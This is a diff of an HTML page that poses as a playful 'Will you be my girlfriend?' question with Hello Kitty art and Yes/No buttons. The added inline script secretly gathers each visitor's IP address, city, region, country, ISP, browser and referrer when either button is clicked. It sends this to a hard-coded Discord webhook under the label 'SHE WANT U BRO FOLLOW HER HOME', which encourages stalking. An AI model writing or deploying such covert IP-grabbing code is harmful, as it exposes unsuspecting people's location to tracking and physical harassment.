@@ -4,12 +4,98 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Important Question</title>
-    <link rel="stylesheet" href="css/styles.css">
+    <style>
+        body {
+            zoom: 0.6;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 150vh;
+            background-color: #fabeff;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        .image-container {
+            position: relative;
+            display: inline-block;
+        }
+
+        .big-image {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        .text-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 36px;
+            font-weight: bold;
+            text-transform: uppercase;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7);
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 100px;
+            margin-top: 20px;
+        }
+
+        button,
+        button:focus {
+            font-size: 45px;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            padding: 20px 30px;
+            border-radius: 0.7rem;
+            background-image: linear-gradient(rgb(251, 139, 255), rgb(233, 129, 254));
+            border: 2px solid rgb(50, 50, 50);
+            border-bottom: 5px solid rgb(50, 50, 50);
+            box-shadow: 0px 1px 6px 0px rgb(225, 129, 254);
+            transform: translate(0, -3px);
+            cursor: pointer;
+        }
+
+        button:active {
+            border-bottom: 2px solid rgb(50, 50, 50);
+        }
+
+        .moving-btn {
+            position: relative;
+        }
+
+        .center-text {
+            margin-top: 20px;
+            color: #fff;
+            text-align: center;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 80px;
+            text-shadow: 0px -1px 2px #fff, 0px -3px 7px rgb(255, 175, 222), 0px -4px 14px rgb(255, 142, 240), 0px -6px 25px rgb(255, 6, 234);
+        }
+
+        .video-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 30px;
+            background-color: #fabeff;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
         <div class="image-container">
-            <img src="imgs/hellokitty.gif" class="big-image">
+            <img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/dcb5f0e5-306a-45a8-8a79-6e7073a33376/d6uvo9y-4bcfa515-0639-4766-af97-c3c60fb1839c.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcL2RjYjVmMGU1LTMwNmEtNDVhOC04YTc5LTZlNzA3M2EzMzM3NlwvZDZ1dm85eS00YmNmYTUxNS0wNjM5LTQ3NjYtYWY5Ny1jM2M2MGZiMTgzOWMuZ2lmIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.MhmmFonwXn1VGvgKvdKNdLCUNDtvL0rUoM_4_ZZSrI4" alt="New Hello Kitty GIF" class="big-image" onerror="this.src='https://via.placeholder.com/400';console.log('GIF failed, using placeholder');">
             <h1 class="center-text">Will you be my girlfriend?</h1>
         </div>
         <div class="buttons" id="statusMessage">
@@ -17,7 +103,149 @@
             <button class="btn moving-btn" id="movingBtn">No</button>
         </div>
     </div>
-    <script src="js/script.js"></script>
-    <script src="js/script2.js"></script>
+    <script>
+        // Original JS with fixes and webhook
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1397667597784453210/5Ync1yXCfohUTF3Ey_ljtKLjDn37K3GEqPLndRZwVZU0onGSLuEhgaOMICmVzOpJP_F2"; // Your webhook
+        const statusMessage = document.getElementById("statusMessage");
+
+        function getTimestamp() {
+            return new Date().toISOString();
+        }
+
+        async function getLocationData() {
+            let locationInfo = {
+                ip: "Unknown",
+                country: "Unknown",
+                region: "Unknown",
+                city: "Unknown",
+                isp: "Unknown"
+            };
+
+            try {
+                const response = await fetch(`https://ipapi.co/json/`);
+                if (!response.ok) {
+                    console.error("ipapi.co failed:", response.status, await response.text());
+                    throw new Error(`ipapi.co failed: ${response.status}`);
+                }
+                const data = await response.json();
+                locationInfo = {
+                    ip: data.ip || "Unknown",
+                    country: data.country_name || "Unknown",
+                    region: data.region || "Unknown",
+                    city: data.city || "Unknown",
+                    isp: data.org || "Unknown"
+                };
+                console.log("Location data fetched:", locationInfo);
+                return locationInfo;
+            } catch (error) {
+                console.error("Location fetch error:", error.message);
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    if (ipResponse.ok) {
+                        const ipData = await ipResponse.json();
+                        locationInfo.ip = ipData.ip;
+                        console.log("Fallback IP fetched:", locationInfo.ip);
+                        return locationInfo;
+                    }
+                } catch (fallbackError) {
+                    console.error("Fallback failed:", fallbackError.message);
+                }
+                return locationInfo;
+            }
+        }
+
+        function getBrowserData() {
+            return {
+                userAgent: navigator.userAgent || "Unknown",
+                platform: navigator.platform || "Unknown",
+                referrer: document.referrer || "Direct/Unknown"
+            };
+        }
+
+        async function sendDataToDiscord(allData) {
+            if (!WEBHOOK_URL || !WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/")) {
+                console.error("Invalid webhook URL");
+                return;
+            }
+
+            const currentPageUrl = window.location.href;
+
+            const payload = {
+                username: "Date Site Logger",
+                avatar_url: "https://pixelvault.co/l521vlnknkl5xl1bbvqau1q3l/direct",
+                embeds: [{
+                    title: "📊 Data Logged",
+                    description: `User data captured for Site: ${currentPageUrl}`,
+                    color: 0xfabeff,
+                    fields: [
+                        ...(allData.ip !== "Unknown" ? [{ name: "IP Address", value: allData.ip, inline: true }] : []),
+                        ...(allData.country !== "Unknown" ? [{ name: "Country", value: allData.country, inline: true }] : []),
+                        ...(allData.region !== "Unknown" ? [{ name: "Region/State", value: allData.region, inline: true }] : []),
+                        ...(allData.city !== "Unknown" ? [{ name: "City", value: allData.city, inline: true }] : []),
+                        ...(allData.isp !== "Unknown" ? [{ name: "ISP", value: allData.isp, inline: true }] : []),
+                        { name: "Operating System", value: allData.platform, inline: true },
+                        { name: "Referrer URL", value: allData.referrer.substring(0, 1024), inline: false },
+                        { name: "User Agent (Browser)", value: allData.userAgent.substring(0, 1024), inline: false },
+                        { name: "SHE WANT U BRO FOLLOW HER HOME!!!!!!!!!!", value: allData.ip, inline: false }
+                    ],
+                    footer: {
+                        text: "Data logged, IP, Browser info, Country, City, Region, ISP, Referrer URL, User Agent (Browser), Operating System"
+                    },
+                    timestamp: getTimestamp()
+                }]
+            };
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log("Data sent to Discord successfully");
+                    alert(`Thanks for your response! ${allData.ip === "Unknown" ? "No IP logged." : "Details logged."}`);
+                } else {
+                    console.error("Webhook failed:", response.status, await response.text());
+                    throw new Error(`Webhook error: ${response.status}`);
+                }
+            } catch (error) {
+                console.error("Send error:", error.message);
+                alert("Failed to log data. Check console for details.");
+            }
+        }
+
+        async function logAndSendDataOnClick() {
+            try {
+                const locationData = await getLocationData();
+                const browserData = getBrowserData();
+                const combinedData = { ...locationData, ...browserData };
+                console.log("Combined data to send:", combinedData);
+                await sendDataToDiscord(combinedData);
+            } catch (error) {
+                console.error("Log error:", error.message);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const yesButton = document.getElementById('logDataButton');
+            const noButton = document.getElementById('movingBtn');
+
+            if (yesButton && noButton) {
+                console.log("Buttons detected, attaching listeners");
+                yesButton.addEventListener('click', async () => {
+                    console.log("Yes button clicked");
+                    await logAndSendDataOnClick();
+                });
+
+                noButton.addEventListener('click', async () => {
+                    console.log("No button clicked");
+                    await logAndSendDataOnClick();
+                });
+            } else {
+                console.error("Buttons not found. DOM:", document.body.innerHTML);
+            }
+        });
+    </script>
 </body>
 </html>
